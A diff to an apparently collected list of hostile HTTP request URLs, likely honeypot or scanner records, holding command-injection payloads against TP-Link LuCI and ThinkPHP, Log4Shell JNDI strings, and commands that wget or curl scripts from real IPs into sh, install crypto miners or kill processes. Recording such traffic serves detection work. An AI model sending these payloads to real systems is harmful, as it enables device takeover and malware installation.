@@ -367,6 +367,7 @@ method GET url /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5h
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuOC4yNDQvbG9sfHNo
 method GET url /cgi-bin/luci/;stok=/locale
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
@@ -375,6 +376,7 @@ method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F185.224.128.34%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.14.226.142%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
+method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60)
 method GET url /remote/login
 method GET url /showLogin.cc
@@ -471,6 +473,7 @@ method GET url /index.php?s=/index/\think\app/invokefunction&function=call_user_
 method GET url /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=curl%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20%7c%7c%20wget%20-O-%20http%3a%2f%2f94.156.79.60%2fgi.sh%20%7c%20sh%20
 method GET url /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=curl%20http%3A%2F%2F193.222.96.163%2Fki.sh%20%7C%20sh%20-s%20thinkphp%20%7C%7C%20wget%20-O-%20http%3A%2F%2F193.222.96.163%2Fki.sh%20%7C%20sh%20-s%20thinkphp
 method GET url /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+method GET url /t(%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//89.34.230.11:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wubG9sL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=%7D%27)
 method GET url /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//95.214.55.202:3306/TomcatBypass/Command/Base64/a2lsbGFsbCAtOSBwYXJhaXNvLng4Njsga2lsbGFsbCAtOSB4bXJpZzsgY3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuYzNwb29sLm9yZy94bXJpZ19zZXR1cC9yYXcvbWFzdGVyL3NldHVwX2MzcG9vbF9taW5lci5zaCB8IExDX0FMTD1lbl9VUy5VVEYtOCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO%7D%27%29
 method GET url http://azenv.net/
 method GET url http://azenv.net/url?key=xxx
@@ -581,6 +584,7 @@ method POST url /development/.env%20
 method POST url /v1/statement
 method POST url /wp-login.php
 method POST url /wordpress/wp-login.php
+method POST url /geoserver/wfs
 method POST url /rpcform/login
 method POST url /tmUnblock.cgi
 method POST url /dologin.action
